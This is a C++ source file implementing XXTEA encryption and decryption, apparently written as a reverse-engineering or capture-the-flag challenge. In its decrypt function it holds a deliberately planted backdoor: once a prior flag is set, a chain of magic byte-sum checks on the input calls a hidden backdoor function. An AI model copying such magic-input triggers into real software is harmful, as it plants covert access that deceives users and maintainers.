#include <cstdint>

#include "backdoor.h"

#define DELTA 0x9e3779b9
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))

#define DEBUG 0
#if DEBUG
#include <cstdio>
#endif
  
__attribute__((always_inline)) inline void xxtea_encrypt(uint32_t* v, uint32_t n, uint32_t* key) {
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    rounds = 6 + 52/n;
    sum = 0;
    z = v[n-1];
    do {
        sum += DELTA;
        e = (sum >> 2) & 3;
        for (p=0; p<n-1; p++) {
            y = v[p+1];
            z = v[p] += MX;
        }
        y = v[0];
        z = v[n-1] += MX;
    } while (--rounds);
}

__attribute__((always_inline)) inline void xxtea_decrypt(uint32_t* v, uint32_t n, uint32_t* key) {
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    rounds = 6 + 52/n;
    sum = rounds*DELTA;
    y = v[0];
    do {
        e = (sum >> 2) & 3;
        for (p=n-1; p>0; p--) {
            z = v[p-1];
            y = v[p] -= MX;
        }
        z = v[n-1];
        y = v[0] -= MX;
        sum -= DELTA;
    } while (--rounds);
}

extern "C" {
void encrypt(const unsigned char* input, int input_length, const unsigned char* key) {
    #if DEBUG
    printf("input: %s\n", input);
    printf("key: %s\n", key);
    printf("input_length: %d\n", input_length);
    #endif
    uint32_t* v = (uint32_t*)input;
    uint32_t n = input_length / 4;
    if (n == 0) {
        return;
    }
    uint32_t* k = (uint32_t*)key;
    xxtea_encrypt(v, n, k);
    #if DEBUG
    // print as hex
    for (int i = 0; i < input_length; i++) {
        printf("%02x", input[i]);
    }
    printf("\n");
    #endif
}

void decrypt(const unsigned char* input, int input_length, const unsigned char* key) {
    #if DEBUG
    // print as hex
    for (int i = 0; i < input_length; i++) {
        printf("%02x", input[i]);
    }
    printf("\n");
    printf("key: %s\n", key);
    printf("input_length: %d\n", input_length);
    printf("backdoor1: %d, backdoor2: %d\n", backdoor1, backdoor2);
    #endif

    // op_backdoor!
    if (backdoor1) {
        // only check if backdoor1 already active
        if (input[0] == input[8] && input[8] == input[9]) {
            // 1 223
            // 2 206
            // 3 209
            // 4 208
            // 5 210
            // 6 218
            // 7 211
            // 8 222
            // 9 222
            // 10 225
            // 11 144
            if (input[0] + input[1] == 223) 
            if (input[0] + input[2] == 206)
            if (input[0] + input[3] == 209)
            if (input[0] + input[4] == 208)
            if (input[0] + input[5] == 210)
            if (input[0] + input[6] == 218)
            if (input[0] + input[7] == 211)
            if (input[0] + input[8] == 222)
            if (input[0] + input[9] == 222)
            if (input[0] + input[10] == 225)
            if (input[0] + input[11] == 144) {
                backdoor2 = true;
                #if DEBUG
                printf("backdoor2 activated\n");
                printf("backdoor1: %d, backdoor2: %d\n", backdoor1, backdoor2);
                #endif
                backdoor_func();
            }
        }
    }

    uint32_t* v = (uint32_t*)input;
    uint32_t n = input_length / 4;
    if (n == 0) {
        return;
    }
    uint32_t* k = (uint32_t*)key;
    xxtea_decrypt(v, n, k);
    #if DEBUG
    printf("output: %s\n", input);
    #endif
}
}